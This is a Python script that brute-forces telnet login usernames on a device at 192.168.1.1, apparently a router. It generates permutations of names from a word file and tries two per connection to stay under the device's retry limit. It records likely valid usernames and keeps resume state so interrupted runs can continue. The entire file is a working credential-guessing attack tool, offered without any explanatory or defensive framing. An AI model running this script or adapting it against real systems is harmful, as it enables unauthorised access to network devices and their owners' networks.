#!/usr/bin/python

import itertools
import telnetlib
import socket
import time


USERNAME_FILE = "combusers.txt"
LAST_USERNAME_FILE = "lastusername.txt"
FOUND_USERNAME_FILE = "foundusername.txt"
TELNET_ADDRESS = "192.168.1.1"
last_username = ""


def main():
    #os.system('(echo "ok"; sleep 1;) | telnet 192.168.1.1 23')
    #p = subprocess.Popen(["telnet", "192.168.1.1"])

    s = username_permutations(permutation_length=4)

    for perm in s:
        print(perm)



"""
Generates permutations of usernames from a file.
"""
def username_permutations(permutation_length=2):

    # Uses a file to generate usernames to bruteforce.
    with open(USERNAME_FILE) as f:
        usernames = f.readlines()
    usernames = [x.strip() for x in usernames]

    # Get all permutations of usernames
    for x in range(1, permutation_length + 1):
        # Use itertools to create a permutation generator object
        permutation_tuple_iterator = itertools.permutations(usernames, x)
        # Combine the tuples retrieved from the generator
        for username_tuple in permutation_tuple_iterator:
            username_combined_string = ''.join(username_tuple)
            yield str(username_combined_string)


def bruteforce_telnet():

    # Create a username permutation generator.
    usernames = username_permutations(5)
    username_list = []
    end_iteration = False

    # Iterate through generator until we reach last username (only needed if script was stopped before)
    while True:
        with open(LAST_USERNAME_FILE) as f:
            username_to_continue_from = f.readline()

        if username_to_continue_from == "":
            break

        try:
            if next(usernames) == username_to_continue_from:
                break
        except StopIteration:
            end_iteration = True
            break

    while not end_iteration:

        # Get username permutations in lists of two, because telnet allows only two tries before disconnecting.
        try:
            username_list.append(next(usernames))
            username_list.append(next(usernames))
        except StopIteration:
            end_iteration = True

        # Main telnet loop.
        while True:
            try:
                # Telnet login
                tn = telnetlib.Telnet(TELNET_ADDRESS, timeout=10)
                tn.set_debuglevel(0)

                # Go through each username in list of two and enter them.
                for username in username_list:

                    global last_username
                    last_username = username

                    # Enter first username
                    tn.read_until(b"Login: ", 1)
                    print("Trying username:", username)
                    tn.write(username.encode('utf-8') + b"\r\n")

                    # Get response of telnet after entering username.
                    tn.read_until(b"\n", 1)
                    response = tn.read_until(b"\n", 1)

                    # Check if we have a match.
                    if b"is incorrect" not in response:
                        print("User name possibly found:")
                        print(username)
                        write_found_username(username)
                tn.close()
                break
            except socket.timeout as e:
                print(e)
            except EOFError as e:
                print(e)
            except ConnectionRefusedError as e:
                print(e)
            except ConnectionResetError as e:
                print(e)

        username_list = []


def write_found_username(found_username):
    text_file = open(FOUND_USERNAME_FILE, "a")
    text_file.write("%s\n" % found_username)
    text_file.close()


if __name__ == "__main__":
    try:
        bruteforce_telnet()
    except BaseException as e:
        f = open(LAST_USERNAME_FILE, "w")
        f.write(last_username)
        f.close()
        raise e


    #main()
